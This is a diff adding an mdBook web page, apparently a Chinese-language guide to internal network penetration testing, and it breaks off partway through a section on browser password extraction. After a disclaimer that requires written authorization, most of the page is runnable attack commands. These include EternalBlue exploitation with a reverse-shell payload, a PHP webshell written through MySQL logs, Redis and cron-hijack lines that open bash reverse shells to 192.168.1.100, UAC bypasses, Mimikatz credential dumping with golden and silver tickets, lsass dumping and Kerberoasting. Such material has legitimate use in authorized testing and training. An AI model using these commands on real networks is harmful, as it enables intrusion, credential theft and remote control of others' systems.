@@ -1,0 +1,1777 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>内网渗透完整学习指南 - 开发</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../theme/pagetoc.css">
+        <link rel="stylesheet" href="../../theme/help-overlay.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">开发</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="搜索本书内容..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <!-- Page table of contents -->
+                        <div class="sidetoc"><nav class="pagetoc"></nav></div>
+
+                        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css">
+<h1 id="内网渗透完整学习指南"><a class="header" href="#内网渗透完整学习指南">内网渗透完整学习指南</a></h1>
+<h2 id="-学习路线图"><a class="header" href="#-学习路线图">📋 学习路线图</a></h2>
+<pre><code>网络基础(2周) → 信息收集(2周) → 漏洞利用(3周) → 权限提升(2周) → 横向移动(3周) → 持久化(1周) → 防御对抗(2周) → 实战演练(持续)
+</code></pre>
+<h2 id="-法律声明与道德准则"><a class="header" href="#-法律声明与道德准则">⚖️ 法律声明与道德准则</a></h2>
+<blockquote>
+<p><strong>严正声明</strong>: 内网渗透必须在获得明确书面授权的前提下进行！</p>
+</blockquote>
+<h3 id="合法使用场景"><a class="header" href="#合法使用场景">合法使用场景</a></h3>
+<ul>
+<li>✅ 企业授权的内部安全评估</li>
+<li>✅ 红蓝对抗演练（双方签署授权协议）</li>
+<li>✅ 安全竞赛与CTF环境</li>
+<li>✅ 自建实验室环境测试</li>
+</ul>
+<h3 id="严格禁止"><a class="header" href="#严格禁止">严格禁止</a></h3>
+<ul>
+<li>❌ 未经授权访问任何内网系统</li>
+<li>❌ 窃取、篡改、删除企业数据</li>
+<li>❌ 破坏生产环境和业务系统</li>
+<li>❌ 利用内网漏洞进行勒索、敲诈</li>
+</ul>
+<h3 id="授权文件必备要素"><a class="header" href="#授权文件必备要素">授权文件必备要素</a></h3>
+<ul>
+<li>明确的测试范围和IP段</li>
+<li>测试时间窗口</li>
+<li>禁止操作清单</li>
+<li>紧急联系人和停止机制</li>
+<li>双方签字盖章的正式文件</li>
+</ul>
+<hr />
+<h2 id="1-基础知识体系"><a class="header" href="#1-基础知识体系">1. 基础知识体系</a></h2>
+<h3 id="11-网络基础深入"><a class="header" href="#11-网络基础深入">1.1 网络基础深入</a></h3>
+<h4 id="tcpip协议栈"><a class="header" href="#tcpip协议栈">TCP/IP协议栈</a></h4>
+<p><strong>四层模型</strong>:</p>
+<pre><code>应用层: HTTP、DNS、SMB、RDP、SSH
+传输层: TCP、UDP
+网络层: IP、ICMP、ARP
+链路层: Ethernet、VLAN
+</code></pre>
+<p><strong>关键协议特性</strong>:</p>
+<pre><code class="language-python"># TCP三次握手流程
+客户端 -&gt; [SYN] -&gt; 服务器
+客户端 &lt;- [SYN+ACK] &lt;- 服务器
+客户端 -&gt; [ACK] -&gt; 服务器
+
+# 内网渗透中的应用
+- 端口扫描: SYN扫描、ACK扫描
+- 防火墙检测: TCP标志位操作
+- 隧道建立: TCP反向连接
+</code></pre>
+<h4 id="网络拓扑识别"><a class="header" href="#网络拓扑识别">网络拓扑识别</a></h4>
+<p><strong>子网划分计算</strong>:</p>
+<pre><code class="language-bash"># CIDR表示法
+192.168.1.0/24    # 256个IP (254可用)
+10.0.0.0/8        # 16,777,216个IP
+172.16.0.0/16     # 65,536个IP
+
+# 子网掩码计算
+/24 = 255.255.255.0
+/16 = 255.255.0.0
+/8  = 255.0.0.0
+</code></pre>
+<p><strong>网关和路由发现</strong>:</p>
+<pre><code class="language-bash"># Windows
+route print
+arp -a
+ipconfig /all
+
+# Linux
+ip route
+ip neigh
+netstat -rn
+
+# 识别多网卡主机（跳板机）
+ip addr show
+ifconfig -a
+</code></pre>
+<h4 id="vlan与网段隔离"><a class="header" href="#vlan与网段隔离">VLAN与网段隔离</a></h4>
+<p><strong>VLAN原理</strong>:</p>
+<pre><code>VLAN 10: 财务部门 (172.16.10.0/24)
+VLAN 20: 研发部门 (172.16.20.0/24)
+VLAN 30: 运维部门 (172.16.30.0/24)
+VLAN 99: 管理VLAN (172.16.99.0/24)
+</code></pre>
+<p><strong>跨VLAN攻击方法</strong>:</p>
+<pre><code class="language-bash"># VLAN Hopping (双重标签)
+# 利用Trunk端口配置错误
+# 通过路由器/三层交换机
+# 寻找多网卡主机作为跳板
+</code></pre>
+<h3 id="12-操作系统基础"><a class="header" href="#12-操作系统基础">1.2 操作系统基础</a></h3>
+<h4 id="windows内核机制"><a class="header" href="#windows内核机制">Windows内核机制</a></h4>
+<p><strong>核心组件</strong>:</p>
+<pre><code>User Mode (用户态):
+├── Win32 应用程序
+├── Windows子系统
+└── POSIX子系统
+
+Kernel Mode (内核态):
+├── Executive (执行体)
+├── Kernel (内核)
+├── Hardware Abstraction Layer (HAL)
+└── Device Drivers (设备驱动)
+</code></pre>
+<p><strong>权限模型</strong>:</p>
+<pre><code>权限等级:
+SYSTEM          # 最高权限
+Administrator   # 管理员
+User            # 普通用户
+Guest           # 访客
+
+域环境权限:
+Domain Admin            # 域管理员
+Enterprise Admin        # 企业管理员
+Schema Admin           # 架构管理员
+Domain User            # 域用户
+</code></pre>
+<p><strong>进程和服务</strong>:</p>
+<pre><code class="language-powershell"># 查看进程
+Get-Process
+tasklist /v
+
+# 查看服务
+Get-Service
+sc query
+
+# 查看启动项
+Get-WmiObject Win32_StartupCommand
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+</code></pre>
+<h4 id="linux系统架构"><a class="header" href="#linux系统架构">Linux系统架构</a></h4>
+<p><strong>目录结构</strong>:</p>
+<pre><code>/bin        # 基本命令
+/sbin       # 系统管理命令
+/etc        # 配置文件
+/var        # 可变数据（日志）
+/tmp        # 临时文件
+/home       # 用户主目录
+/root       # root用户主目录
+/usr        # 用户程序
+</code></pre>
+<p><strong>权限模型</strong>:</p>
+<pre><code class="language-bash"># 文件权限
+rwxrwxrwx = 777
+- 所有者 | 组 | 其他用户
+
+# 特殊权限
+SUID (4000): 以文件所有者身份执行
+SGID (2000): 以文件所属组身份执行
+Sticky Bit (1000): 仅所有者可删除
+
+# 查看SUID程序
+find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -2000 -type f 2&gt;/dev/null
+</code></pre>
+<hr />
+<h2 id="2-信息收集技术"><a class="header" href="#2-信息收集技术">2. 信息收集技术</a></h2>
+<h3 id="21-主机发现"><a class="header" href="#21-主机发现">2.1 主机发现</a></h3>
+<h4 id="icmp扫描"><a class="header" href="#icmp扫描">ICMP扫描</a></h4>
+<pre><code class="language-bash"># Ping扫描
+nmap -sn 192.168.1.0/24
+
+# 批量ping（Windows）
+for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL="
+
+# 批量ping（Linux）
+for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" &amp; done
+</code></pre>
+<h4 id="arp扫描"><a class="header" href="#arp扫描">ARP扫描</a></h4>
+<pre><code class="language-bash"># Nmap ARP扫描（本地网段）
+nmap -PR 192.168.1.0/24
+
+# arp-scan工具
+arp-scan -l
+arp-scan --interface=eth0 192.168.1.0/24
+
+# NetDiscover
+netdiscover -r 192.168.1.0/24 -i eth0
+
+# 手工ARP请求
+arping -c 3 192.168.1.1
+</code></pre>
+<h4 id="tcpudp端口扫描"><a class="header" href="#tcpudp端口扫描">TCP/UDP端口扫描</a></h4>
+<p><strong>常见内网服务端口</strong>:</p>
+<pre><code>21    - FTP
+22    - SSH
+23    - Telnet
+25    - SMTP
+53    - DNS
+80    - HTTP
+88    - Kerberos
+135   - MS RPC
+139   - NetBIOS
+389   - LDAP
+443   - HTTPS
+445   - SMB
+1433  - MSSQL
+1521  - Oracle
+3306  - MySQL
+3389  - RDP
+5432  - PostgreSQL
+5900  - VNC
+6379  - Redis
+8080  - HTTP Proxy
+27017 - MongoDB
+</code></pre>
+<p><strong>快速扫描策略</strong>:</p>
+<pre><code class="language-bash"># 快速扫描常用端口
+nmap -p 21,22,23,80,443,445,3389,3306,1433 192.168.1.0/24 -T4 --open
+
+# 全端口扫描
+masscan -p1-65535 192.168.1.0/24 --rate=10000
+
+# Top 1000端口
+nmap -sS --top-ports 1000 192.168.1.0/24
+
+# UDP服务扫描
+nmap -sU -p 53,161,162,500 192.168.1.0/24
+</code></pre>
+<h3 id="22-端口服务扫描"><a class="header" href="#22-端口服务扫描">2.2 端口服务扫描</a></h3>
+<h4 id="nmap高级技巧"><a class="header" href="#nmap高级技巧">Nmap高级技巧</a></h4>
+<p><strong>脚本引擎（NSE）</strong>:</p>
+<pre><code class="language-bash"># 漏洞扫描
+nmap --script=vuln 192.168.1.10
+
+# SMB漏洞检测
+nmap -p 445 --script smb-vuln-* 192.168.1.10
+
+# 弱密码爆破
+nmap -p 22 --script ssh-brute 192.168.1.10
+nmap -p 3306 --script mysql-brute 192.168.1.10
+
+# 信息泄露
+nmap -p 80 --script http-enum 192.168.1.10
+nmap -p 445 --script smb-enum-shares 192.168.1.10
+
+# 详细服务识别
+nmap -sV -p- --version-all 192.168.1.10
+</code></pre>
+<p><strong>操作系统指纹识别</strong>:</p>
+<pre><code class="language-bash"># OS检测
+nmap -O 192.168.1.10
+
+# 详细OS信息
+nmap -A 192.168.1.10
+
+# TTL值判断
+# 64  - Linux
+# 128 - Windows
+# 255 - 网络设备
+</code></pre>
+<h3 id="23-域环境信息收集"><a class="header" href="#23-域环境信息收集">2.3 域环境信息收集</a></h3>
+<h4 id="域控制器定位"><a class="header" href="#域控制器定位">域控制器定位</a></h4>
+<p><strong>DNS查询方法</strong>:</p>
+<pre><code class="language-bash"># 查询域控制器
+nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
+
+# 查询所有DC
+nltest /dclist:domain.com
+
+# 查询主域控
+nltest /dsgetdc:domain.com
+
+# PowerShell查询
+Get-ADDomainController -Filter *
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
+</code></pre>
+<p><strong>NetBIOS查询</strong>:</p>
+<pre><code class="language-bash"># 查询域控
+net group "Domain Controllers" /domain
+
+# 查询域信息
+net view /domain
+net view /domain:WORKGROUP
+</code></pre>
+<h4 id="域用户枚举"><a class="header" href="#域用户枚举">域用户枚举</a></h4>
+<p><strong>LDAP查询</strong>:</p>
+<pre><code class="language-bash"># 枚举所有用户
+ldapsearch -x -h dc.domain.com -b "dc=domain,dc=com" "(objectClass=user)"
+
+# 查询管理员组
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+
+# PowerView枚举
+Get-NetUser
+Get-NetUser -AdminCount
+Get-NetGroup "Domain Admins"
+</code></pre>
+<p><strong>Kerberos枚举</strong>:</p>
+<pre><code class="language-bash"># 用户名枚举（AS-REP Roasting）
+GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request
+
+# 服务账户枚举
+GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.com/user:password
+</code></pre>
+<h4 id="域信任关系分析"><a class="header" href="#域信任关系分析">域信任关系分析</a></h4>
+<pre><code class="language-powershell"># 查询信任关系
+nltest /domain_trusts
+Get-ADTrust -Filter *
+
+# 查询林信任
+Get-ADForest | Select-Object Domains
+
+# 枚举跨域权限
+Find-ForeignUser
+Find-ForeignGroup
+</code></pre>
+<h4 id="gpo策略收集"><a class="header" href="#gpo策略收集">GPO策略收集</a></h4>
+<pre><code class="language-powershell"># 枚举所有GPO
+Get-GPO -All
+
+# 查找GPO中的密码
+Get-GPPPassword
+
+# 查询应用的GPO
+gpresult /R
+gpresult /H report.html
+
+# 导出GPO配置
+Get-GPOReport -All -ReportType HTML -Path gpo_report.html
+</code></pre>
+<hr />
+<h2 id="3-漏洞发现与利用"><a class="header" href="#3-漏洞发现与利用">3. 漏洞发现与利用</a></h2>
+<h3 id="31-内网web应用漏洞"><a class="header" href="#31-内网web应用漏洞">3.1 内网Web应用漏洞</a></h3>
+<p><strong>内网应用特点</strong>:</p>
+<pre><code>- 安全防护较弱（无WAF）
+- 存在默认密码
+- 版本陈旧未打补丁
+- 开发测试环境暴露
+</code></pre>
+<p><strong>常见漏洞</strong>:</p>
+<pre><code class="language-bash"># 未授权访问
+Jenkins未授权RCE
+Tomcat Manager弱密码
+phpMyAdmin默认密码
+
+# 配置错误
+.git目录泄露
+.svn目录泄露
+备份文件泄露（.bak, .old, .zip）
+
+# 框架漏洞
+Struts2 RCE
+Weblogic反序列化
+ThinkPHP RCE
+</code></pre>
+<h3 id="32-系统服务漏洞利用"><a class="header" href="#32-系统服务漏洞利用">3.2 系统服务漏洞利用</a></h3>
+<h4 id="smb漏洞利用"><a class="header" href="#smb漏洞利用">SMB漏洞利用</a></h4>
+<p><strong>EternalBlue (MS17-010)</strong>:</p>
+<pre><code class="language-bash"># 漏洞检测
+nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10
+
+# Metasploit利用
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+exploit
+</code></pre>
+<p><strong>SMB中继攻击</strong>:</p>
+<pre><code class="language-bash"># Responder捕获哈希
+responder -I eth0 -wrf
+
+# ntlmrelayx中继
+ntlmrelayx.py -t 192.168.1.20 -smb2support
+
+# MultiRelay配置
+python MultiRelay.py -t 192.168.1.20 -u ALL
+</code></pre>
+<h4 id="rdp漏洞利用"><a class="header" href="#rdp漏洞利用">RDP漏洞利用</a></h4>
+<p><strong>BlueKeep (CVE-2019-0708)</strong>:</p>
+<pre><code class="language-bash"># 漏洞扫描
+nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.0/24
+
+# Metasploit检测
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+set RHOSTS 192.168.1.0/24
+run
+
+# 暴力破解
+crowbar -b rdp -s 192.168.1.10/32 -u admin -C passwords.txt
+hydra -l administrator -P passwords.txt rdp://192.168.1.10
+</code></pre>
+<h4 id="ssh漏洞利用"><a class="header" href="#ssh漏洞利用">SSH漏洞利用</a></h4>
+<p><strong>弱密码爆破</strong>:</p>
+<pre><code class="language-bash"># Hydra爆破
+hydra -L users.txt -P passwords.txt ssh://192.168.1.10
+
+# Medusa爆破
+medusa -h 192.168.1.10 -u root -P passwords.txt -M ssh
+
+# 字典生成
+cewl http://company.com -w wordlist.txt
+crunch 8 12 -t root%%%% -o passwords.txt
+</code></pre>
+<p><strong>SSH密钥窃取</strong>:</p>
+<pre><code class="language-bash"># 查找私钥
+find / -name id_rsa 2&gt;/dev/null
+find / -name id_dsa 2&gt;/dev/null
+find /home -name authorized_keys 2&gt;/dev/null
+
+# 使用窃取的密钥
+chmod 600 id_rsa
+ssh -i id_rsa user@192.168.1.10
+</code></pre>
+<h4 id="数据库服务漏洞"><a class="header" href="#数据库服务漏洞">数据库服务漏洞</a></h4>
+<p><strong>MySQL提权</strong>:</p>
+<pre><code class="language-sql">-- UDF提权
+CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.dll';
+SELECT sys_exec('whoami');
+
+-- 日志写入Webshell
+SET GLOBAL general_log = 'ON';
+SET GLOBAL general_log_file = 'C:/inetpub/wwwroot/shell.php';
+SELECT '&lt;?php eval($_POST["cmd"]); ?&gt;';
+</code></pre>
+<p><strong>MSSQL利用</strong>:</p>
+<pre><code class="language-sql">-- xp_cmdshell执行命令
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+-- OLE Automation执行
+EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
+EXEC sp_OAMethod @shell, 'run', NULL, 'cmd.exe /c whoami';
+</code></pre>
+<p><strong>Redis未授权访问</strong>:</p>
+<pre><code class="language-bash"># 写入SSH公钥
+redis-cli -h 192.168.1.10
+config set dir /root/.ssh
+config set dbfilename authorized_keys
+set x "\n\nssh-rsa AAAA...\n\n"
+save
+
+# 写入Crontab
+config set dir /var/spool/cron
+config set dbfilename root
+set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1\n"
+save
+</code></pre>
+<hr />
+<h2 id="4-权限提升"><a class="header" href="#4-权限提升">4. 权限提升</a></h2>
+<h3 id="41-windows权限提升"><a class="header" href="#41-windows权限提升">4.1 Windows权限提升</a></h3>
+<h4 id="uac绕过"><a class="header" href="#uac绕过">UAC绕过</a></h4>
+<p><strong>常用方法</strong>:</p>
+<pre><code class="language-powershell"># eventvwr.exe绕过（适用于Win7-Win10）
+New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe" -Force
+Start-Process "eventvwr.exe"
+
+# fodhelper.exe绕过（Win10）
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c powershell.exe" -Force
+Start-Process "fodhelper.exe"
+</code></pre>
+<h4 id="服务权限滥用"><a class="header" href="#服务权限滥用">服务权限滥用</a></h4>
+<p><strong>不安全服务权限</strong>:</p>
+<pre><code class="language-powershell"># 枚举可修改的服务
+Get-ServiceUnquoted
+Get-ModifiableServiceFile
+Get-ModifiableService
+
+# PowerUp枚举
+Invoke-AllChecks
+
+# 利用unquoted服务路径
+# 服务路径: C:\Program Files\Some Service\service.exe
+# 尝试创建: C:\Program.exe 或 C:\Program Files\Some.exe
+
+# 利用可写服务二进制
+sc qc vulnerable_service
+icacls "C:\path\to\service.exe"
+# 替换服务二进制为恶意程序
+</code></pre>
+<h4 id="token窃取"><a class="header" href="#token窃取">Token窃取</a></h4>
+<p><strong>Token操作</strong>:</p>
+<pre><code class="language-powershell"># 列举进程Token
+Invoke-TokenManipulation -Enumerate
+
+# 窃取SYSTEM Token
+Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
+
+# 使用Incognito（Meterpreter）
+load incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\\SYSTEM"
+</code></pre>
+<h4 id="内核漏洞利用"><a class="header" href="#内核漏洞利用">内核漏洞利用</a></h4>
+<p><strong>常见内核提权漏洞</strong>:</p>
+<pre><code class="language-bash"># MS16-032（Win7/8/10）
+Invoke-MS16032
+
+# MS15-051（Win7/8/Server 2008/2012）
+use exploit/windows/local/ms15_051_client_copy_image
+
+# MS14-058（Win7/8/Server 2008/2012）
+use exploit/windows/local/ms14_058_track_popup_menu
+
+# 自动化枚举
+./windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
+</code></pre>
+<h3 id="42-linux权限提升"><a class="header" href="#42-linux权限提升">4.2 Linux权限提升</a></h3>
+<h4 id="suidsgid滥用"><a class="header" href="#suidsgid滥用">SUID/SGID滥用</a></h4>
+<p><strong>查找SUID程序</strong>:</p>
+<pre><code class="language-bash"># 查找所有SUID程序
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# 常见可利用的SUID程序
+find / -name vim* -exec ls -l {} \; 2&gt;/dev/null
+find / -name nmap* -exec ls -l {} \; 2&gt;/dev/null
+find / -name python* -exec ls -l {} \; 2&gt;/dev/null
+</code></pre>
+<p><strong>利用示例</strong>:</p>
+<pre><code class="language-bash"># vim提权
+vim -c ':!/bin/bash'
+
+# nmap提权（旧版本）
+nmap --interactive
+!sh
+
+# find提权
+find /home -exec /bin/bash \;
+
+# python提权
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+</code></pre>
+<h4 id="定时任务劫持"><a class="header" href="#定时任务劫持">定时任务劫持</a></h4>
+<pre><code class="language-bash"># 查找可写的cron任务
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+# 查找可写的脚本
+find /etc/cron* -type f -perm -o+w 2&gt;/dev/null
+
+# 利用PATH劫持
+# 在脚本中创建恶意同名命令
+echo -e '#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1' &gt; /tmp/ps
+chmod +x /tmp/ps
+export PATH=/tmp:$PATH
+</code></pre>
+<h4 id="内核漏洞利用-1"><a class="header" href="#内核漏洞利用-1">内核漏洞利用</a></h4>
+<p><strong>脏牛（Dirty COW）</strong>:</p>
+<pre><code class="language-bash"># CVE-2016-5195检测
+uname -a
+cat /etc/issue
+
+# 编译利用
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty password
+
+# 利用后
+su firefart  # 密码: password
+</code></pre>
+<p><strong>常用提权工具</strong>:</p>
+<pre><code class="language-bash"># LinEnum
+./LinEnum.sh
+
+# linpeas
+./linpeas.sh
+
+# linux-exploit-suggester
+./linux-exploit-suggester.sh
+
+# BeRoot
+python beroot.py
+</code></pre>
+<hr />
+<h2 id="5-横向移动技术"><a class="header" href="#5-横向移动技术">5. 横向移动技术</a></h2>
+<h3 id="51-凭证获取"><a class="header" href="#51-凭证获取">5.1 凭证获取</a></h3>
+<h4 id="windows密码哈希提取"><a class="header" href="#windows密码哈希提取">Windows密码哈希提取</a></h4>
+<p><strong>Mimikatz</strong>:</p>
+<pre><code class="language-powershell"># 提权到SYSTEM
+privilege::debug
+token::elevate
+
+# 提取明文密码
+sekurlsa::logonpasswords
+
+# 提取哈希
+lsadump::sam
+lsadump::secrets
+
+# 提取Kerberos票据
+sekurlsa::tickets /export
+
+# 黄金票据
+kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt
+
+# 白银票据
+kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:hash /ptt
+</code></pre>
+<p><strong>Procdump + Mimikatz</strong>:</p>
+<pre><code class="language-bash"># 1. 使用Procdump导出lsass
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# 2. 离线解析
+mimikatz.exe
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+</code></pre>
+<p><strong>LaZagne</strong>:</p>
+<pre><code class="language-bash"># 提取所有密码
+laZagne.exe all
+
+# 提取浏览器密码
+laZagne.exe browsers
+
+# 提取系统密码
+laZagne.exe sysadmin
+</code></pre>
+<h4 id="kerberos攻击"><a class="header" href="#kerberos攻击">Kerberos攻击</a></h4>
+<p><strong>Kerberoasting</strong>:</p>
+<pre><code class="language-powershell"># 请求服务票据
+Get-DomainUser -SPN
+Request-SPNTicket -SPN "MSSQLSvc/server.domain.com:1433"
+
+# 导出票据
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+# 离线破解
+python tgsrepcrack.py wordlist.txt ticket.kirbi
+hashcat -m 13100 ticket.hash wordlist.txt
+</code></pre>
+<p><strong>AS-REP Roasting</strong>:</p>
+<pre><code class="language-bash"># 枚举不需要预认证的用户
+Get-DomainUser -PreauthNotRequired
+
+# 请求AS-REP
+GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request
+
+# 破解哈希
+hashcat -m 18200 asrep.hash wordlist.txt
+</code></pre>
+<h4 id="浏览器密码提取"><a class="header" href="#浏览器密码提取">浏览器密码提取</a></h4>
+<pre><code class="language-powershell"># Chrome密码提取
+$loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
